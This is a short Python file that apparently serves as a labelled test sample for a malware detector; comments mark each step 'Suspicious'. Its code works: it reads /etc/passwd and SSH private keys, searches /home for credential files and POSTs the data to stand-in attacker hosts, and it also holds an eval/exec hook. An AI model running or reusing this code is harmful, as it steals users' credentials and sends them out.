#!/usr/bin/env python3
"""
Data Exfiltration Script - Test File 4
Simulates data theft and exfiltration
"""

import os
import base64
import requests
import zipfile

# Suspicious: Searching for sensitive files
def find_sensitive_files():
    sensitive_patterns = ["password", "credential", "secret", "token"]
    found_files = []
    
    for root, dirs, files in os.walk("/home"):
        for file in files:
            if any(pattern in file.lower() for pattern in sensitive_patterns):
                found_files.append(os.path.join(root, file))
    
    return found_files

# Suspicious: Reading sensitive data
def steal_credentials():
    credentials = []
    
    # Reading password files
    try:
        with open("/etc/passwd", "r") as f:
            credentials.append(f.read())
    except:
        pass
    
    # Reading SSH keys
    ssh_key_path = os.path.expanduser("~/.ssh/id_rsa")
    if os.path.exists(ssh_key_path):
        with open(ssh_key_path, "r") as f:
            credentials.append(f.read())
    
    return credentials

# Suspicious: Encoding stolen data
def encode_data(data):
    encoded = base64.b64encode(data.encode())
    return encoded

# Suspicious: Exfiltrating data to external server
def exfiltrate_data(data):
    # Suspicious: HTTP POST to external server
    exfil_url = "http://attacker-server.com/receive"
    
    encoded_data = encode_data(str(data))
    
    # Suspicious: Sending stolen data
    response = requests.post(exfil_url, data={"stolen": encoded_data})
    
    # Alternative: HTTPS exfiltration
    https_url = "https://evil-domain.net/upload"
    requests.post(https_url, files={"data": data})

# Suspicious: Compressing and hiding data
def prepare_exfiltration():
    sensitive_files = find_sensitive_files()
    
    # Creating archive of stolen data
    with zipfile.ZipFile("/tmp/backup.zip", "w") as zf:
        for file in sensitive_files:
            try:
                zf.write(file)
            except:
                pass
    
    # Suspicious: Base64 encoding the archive
    with open("/tmp/backup.zip", "rb") as f:
        archive_data = f.read()
        encoded_archive = base64.b64encode(archive_data)
    
    return encoded_archive

# Suspicious: Using eval for dynamic code execution
def execute_remote_command(command):
    eval(command)
    exec(command)

if __name__ == "__main__":
    stolen_data = steal_credentials()
    exfiltrate_data(stolen_data)
    print("Data exfiltration complete")
